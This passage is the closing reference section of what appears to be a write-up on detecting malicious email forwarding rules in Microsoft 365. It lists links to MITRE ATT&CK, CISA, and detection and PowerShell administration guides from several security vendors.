- **Reference:** [CISA APT28 Alert](https://www.cisa.gov/news-events/alerts/2021/04/15/cisa-adds-two-known-exploited-vulnerabilities-catalog)

---

## Appendix: References & Sources

1. [MITRE ATT&CK T1114.003 - Email Forwarding Rule](https://attack.mitre.org/techniques/T1114/003/)
2. [Red Canary - Email Forwarding Rule Detection](https://redcanary.com/threat-detection-report/techniques/email-forwarding-rule/)
3. [Red Canary - How Adversaries Abuse Office 365 Email Rules](https://redcanary.com/blog/threat-detection/o365-email-rules-mindmap/)
4. [Splunk - O365 New Email Forwarding Rule Enabled](https://research.splunk.com/cloud/ac7c4d0a-06a3-4278-aa59-88a5e537f981/)
5. [Vectra AI - M365 Suspicious Mail Forwarding Detection](https://www.vectra.ai/detections/o365-suspicious-mail-forwarding)
6. [Admin Droid - Securing Compromised M365 Accounts](https://blog.admindroid.com/secure-a-compromised-email-account-in-microsoft-365/)
7. [Microsoft Learn - Exchange Online Mailbox Auditing](https://learn.microsoft.com/en-us/exchange/security-and-compliance/exchange-auditing-reports/exchange-auditing-reports)
8. [MPCA Solutions - Hidden Outlook Inbox Rules Detection](https://www.mpca.solutions/wp/knowledgebase/topic/outlook-mailbox-forwarding-rule-hidden-powershell-automatic-replies/)
9. [Code Two - Managing Outlook Rules with PowerShell](https://www.codetwo.com/admins-blog/managing-outlook-rules-powershell/)
10. [Huntress - Detect Hidden Inbox Rules](https://www.huntress.com/cybersecurity-insights/microsoft-365-hidden-inbox-rule-detection)
11. [Samuraj-CZ - Exchange Inbox Rules via PowerShell](https://www.samuraj-cz.com/en/article/exchange-creating-inbox-rules-using-powershell-and-owa/)

---
